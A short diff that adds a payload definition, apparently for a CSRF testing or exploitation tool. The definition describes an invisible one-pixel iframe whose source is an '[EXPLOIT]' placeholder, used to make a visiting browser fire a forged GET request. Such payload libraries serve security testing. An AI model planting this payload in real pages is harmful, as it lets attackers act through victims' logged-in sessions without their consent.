@@ -1,0 +1,6 @@
+[Payload]
+type = csrf
+method = get
+title = IFRAME HTML Balise
+description: The IFRAME HTML balise display execute a GET request.
+payload = <iframe src="[EXPLOIT]" width="1" height="1"></iframe>
